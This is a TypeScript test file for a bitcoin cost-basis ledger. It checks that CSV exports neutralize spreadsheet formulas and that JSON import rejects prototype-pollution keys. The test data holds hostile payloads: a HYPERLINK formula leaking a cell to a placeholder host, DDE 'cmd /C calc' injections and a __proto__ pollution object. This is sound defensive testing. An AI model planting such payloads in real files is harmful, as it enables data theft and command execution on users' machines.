/** Exports, imports and hostile input (from an adversarial review). Synthetic data only. */
import { describe, expect, test } from 'vitest';
import { replay } from '../src/replay.ts';
import { exportEntriesJson, exportOpeningLotsCsv, form8949Csv, importEntriesJson, importOpeningLotsCsv, incomeCsv } from '../src/io.ts';
import { neutralizeFormula, parseCsv, restoreFormula } from '../src/csv.ts';
import { parseEntry } from '../src/validate.ts';
import type { Entry, LedgerState } from '../src/types.ts';
import { buy, cents, errorCodes, noon, pick, receive, sell, TZ, wallet } from './helpers.ts';

const DANGEROUS = /^[=+\-@\t\r]/;
/** Text cells (not numeric columns) of a CSV that start with a formula trigger. */
function dangerousTextCells(csv: string, numericCols: readonly string[]): string[] {
  const parsed = parseCsv(csv);
  if (!parsed.ok) throw new Error(parsed.error);
  const [header, ...rows] = parsed.value;
  const out: string[] = [];
  for (const r of rows) r.forEach((c, i) => { if (!numericCols.includes(header?.[i] ?? '') && DANGEROUS.test(c)) out.push(c); });
  return out;
}

describe('CSV injection in exports', () => {
  const evil = [
    wallet('ex', 'exchange', '=HYPERLINK("https://example.invalid/?x="&A1,"Coinbase")'),
    { ...buy('B', 'ex', '2024-01-01', '1', '1000'), proof: '+cmd|" /C calc"!A0' } as Entry,
    receive('I', 'ex', '2025-01-01', '0.001', '25', { type: 'income', description: '@SUM(1+1)*cmd|" /C calc"!A0' }),
    sell('S', 'ex', '2025-06-01', [pick('B', '0.5')], '300'),
  ];
  const state = replay(evil);
  test('Form 8949 CSV neutralizes text cells; numeric columns (a negative gain) are untouched', () => {
    const csv = form8949Csv(state, 2025);
    expect(dangerousTextCells(csv, ['proceeds', 'cost', 'gain'])).toEqual([]);
    expect(csv).toContain(',300.00,500.00,-200.00,sell,');
    expect(csv).toContain(`"'=HYPERLINK(`);
  });
  test('income CSV neutralizes descriptions starting with @', () => {
    expect(dangerousTextCells(incomeCsv(state, 2025), ['sats', 'btc', 'value_usd'])).toEqual([]);
  });
  test('opening-lots CSV neutralizes origin/proof starting with +, and import reads the names back', () => {
    const csv = exportOpeningLotsCsv(state).csv;
    expect(dangerousTextCells(csv, ['btc', 'sats', 'cost_usd', 'cost_per_btc'])).toEqual([]);
    const back = importOpeningLotsCsv(csv, { wallets: state.wallets, tz: TZ, newId: () => 'n1' });
    expect(back.ok && back.value.entries.map((e) => [e.wallet, e.origin])).toEqual([['ex', '+cmd|" /C calc"!A0'], ['ex', 'Email receipt']]);
  });
  test('neutralize and restore', () => {
    expect(['=1', '+1', '-1', '@1', '\t1', '\r1', 'ok', "'=1", "''-1", "'ok", ''].map(neutralizeFormula)).toEqual(["'=1", "'+1", "'-1", "'@1", "'\t1", "'\r1", 'ok', "''=1", "'''-1", "'ok", '']);
    expect(["'=1", "''=1", "'''-1", "'ok", 'ok', "'"].map(restoreFormula)).toEqual(['=1', "'=1", "''-1", "'ok", 'ok', "'"]);
  });
});

describe('opening-lots CSV round trip', () => {
  const reimport = (state: LedgerState, tz: string): LedgerState => {
    const csv = exportOpeningLotsCsv(state).csv;
    let n = 0;
    const r = importOpeningLotsCsv(csv, { wallets: state.wallets, tz, newId: () => `n${String(n++).padStart(4, '0')}` });
    if (!r.ok) throw new Error(JSON.stringify(r.error));
    return replay([wallet('ex'), ...r.value.entries]);
  };
  test('a lot bought in another time zone keeps its acquired local date (the tz column)', () => {
    // Bought 2025-01-15 20:00 UTC while in Tokyo: local date 2025-01-16.
    const b: Entry = { id: 'B', kind: 'buy', at: '2025-01-15T20:00:00Z', tz: 'Asia/Tokyo', wallet: 'ex', sats: 100_000, costCents: 100, tier: 'documented' };
    const state = replay([wallet('ex'), b]);
    expect(state.lots[0]?.acquiredDate).toBe('2025-01-16');
    expect(reimport(state, TZ).lots[0]).toMatchObject({ acquiredDate: '2025-01-16', tz: 'Asia/Tokyo' });
  });
  test('without a tz column, or with an empty cell, the import time zone applies; a bad zone is a row problem', () => {
    const wallets = replay([wallet('ex')]).wallets;
    const header = 'wallet,acquired_utc,btc,sats,cost_usd,cost_per_btc,tier,origin';
    const r = importOpeningLotsCsv(`${header}\nex,2025-01-15 20:00:00,,1,1,,Documented,x\n`, { wallets, tz: 'Asia/Tokyo', newId: () => 'n1' });
    expect(r.ok && r.value.entries[0]?.tz).toBe('Asia/Tokyo');
    const empty = importOpeningLotsCsv(`${header},tz\nex,2025-01-15 20:00:00,,1,1,,Documented,x,\n`, { wallets, tz: TZ, newId: () => 'n1' });
    expect(empty.ok && empty.value.entries[0]?.tz).toBe(TZ);
    const bad = importOpeningLotsCsv(`${header},tz\nex,2025-01-15 20:00:00,,1,1,,Documented,x,Mars/Base\n`, { wallets, tz: TZ, newId: () => 'n1' });
    expect(bad).toEqual({ ok: false, error: [{ row: 2, message: 'tz "Mars/Base" is not a time zone like America/Boise' }] });
  });
  test('amounts over the per-entry limits are row problems', () => {
    const wallets = replay([wallet('ex')]).wallets;
    const header = 'wallet,acquired_utc,btc,sats,cost_usd,cost_per_btc,tier,origin';
    const r = importOpeningLotsCsv(`${header}\nex,2025-01-15 20:00:00,,2100000000000001,1000000000000.01,,Documented,x\n`, { wallets, tz: TZ, newId: () => 'n1' });
    expect(r.ok ? [] : r.error.map((p) => p.message)).toEqual(['sats "2100000000000001" is not a whole number from 1 to 21,000,000 BTC', 'cost_usd "1000000000000.01" is not a dollar amount up to $1 trillion']);
  });
  test('sub-second acquisition order survives (oldest-first order)', () => {
    const a: Entry = { id: 'z-first', kind: 'buy', at: '2025-01-15T20:00:00.100Z', tz: TZ, wallet: 'ex', sats: 1000, costCents: 1, tier: 'documented' };
    const b: Entry = { id: 'a-second', kind: 'buy', at: '2025-01-15T20:00:00.900Z', tz: TZ, wallet: 'ex', sats: 1000, costCents: 999, tier: 'documented' };
    const state = replay([wallet('ex'), a, b]);
    const back = reimport(state, TZ);
    expect(back.lots.map((l) => l.acquiredAt)).toEqual(state.lots.map((l) => l.acquiredAt));
  });
  test('wallet names are unique among non-archived wallets, so export then import matches', () => {
    const state = replay([wallet('a', 'exchange', 'Cold'), wallet('b', 'self-custody', ' cold '), buy('B', 'a', '2024-01-01', '1', '1')]);
    expect(errorCodes(state)).toEqual({ 'w-b': 'wallet-name-taken' });
    const r = importOpeningLotsCsv(exportOpeningLotsCsv(state).csv, { wallets: state.wallets, tz: TZ, newId: () => 'x' });
    expect(r.ok).toBe(true);
  });
  test('renaming or unarchiving into a taken name is refused; archiving frees nothing at creation (wallets replay first)', () => {
    const upd = (id: string, w: string, fields: { name?: string; archived?: boolean }): Entry => ({ id, kind: 'wallet-update', at: noon('2025-01-01'), tz: TZ, wallet: w, ...fields });
    const state = replay([wallet('a', 'exchange', 'Cold'), wallet('b', 'exchange', 'Hot'), upd('u1', 'b', { name: 'COLD' }), upd('u2', 'a', { archived: true }), upd('u3', 'b', { name: 'Cold' }), upd('u4', 'a', { archived: false }), upd('u5', 'a', { name: 'Old cold', archived: false })]);
    expect(errorCodes(state)).toEqual({ u1: 'wallet-name-taken', u4: 'wallet-name-taken' });
    expect(state.wallets.map((w) => [w.name, w.archived])).toEqual([['Old cold', false], ['Cold', false]]);
  });
  test('dual-basis gift lots are flagged in the export warnings', () => {
    const state = replay([wallet('ex'), receive('G', 'ex', '2026-01-10', '0.1', '6000', { type: 'gift', giverCostCents: cents('10000'), giverAcquiredAt: noon('2022-01-01') })]);
    expect(exportOpeningLotsCsv(state).warnings).toEqual(["Lot G is a gift worth less than the giver's cost (dual basis); the CSV cannot record that."]);
  });
});

describe('hostile JSON', () => {
  test('__proto__ / constructor keys are rejected, Object.prototype untouched', () => {
    const r = importEntriesJson(JSON.stringify({ format: 'bitcoin-basis-entries', version: 1, entries: [] }).replace('"entries":[]', '"entries":[{"id":"x","kind":"settings","at":"2025-01-01T00:00:00Z","tz":"UTC","patch":{"__proto__":{"polluted":1}}}]'));
    expect(r.ok).toBe(false);
    expect(({} as Record<string, unknown>)['polluted']).toBeUndefined();
    expect(parseEntry(JSON.parse('{"id":"x","kind":"__proto__","at":"2025-01-01T00:00:00Z","tz":"UTC"}')).ok).toBe(false);
  });
  test('numbers beyond 2^53 are rejected rather than rounded', () => {
    const r = importEntriesJson('{"format":"bitcoin-basis-entries","version":1,"entries":[{"id":"x","kind":"buy","at":"2025-01-01T00:00:00Z","tz":"UTC","wallet":"w","sats":9007199254740993,"costCents":1,"tier":"documented"}]}');
    expect(r.ok).toBe(false);
  });
  test('entries JSON round trip is exact', () => {
    const entries = [wallet('ex'), buy('B', 'ex', '2024-01-01', '0.12345678', '1234.56')];
    const r = importEntriesJson(exportEntriesJson(entries));
    expect(r.ok && replay(r.value)).toEqual(replay(entries));
  });
});

describe('Form 8949 conventions', () => {
  test('inherited coins show "INHERITED" as date acquired (Form 8949 instructions, column (b))', () => {
    const state = replay([wallet('ex'), receive('I', 'ex', '2026-01-01', '0.5', '40000', { type: 'inherited' }), sell('S', 'ex', '2026-01-22', [pick('I', '0.5')], '41000')]);
    const parsed = parseCsv(form8949Csv(state, 2026));
    expect(parsed.ok && parsed.value[1]?.[2]).toBe('INHERITED');
  });
});
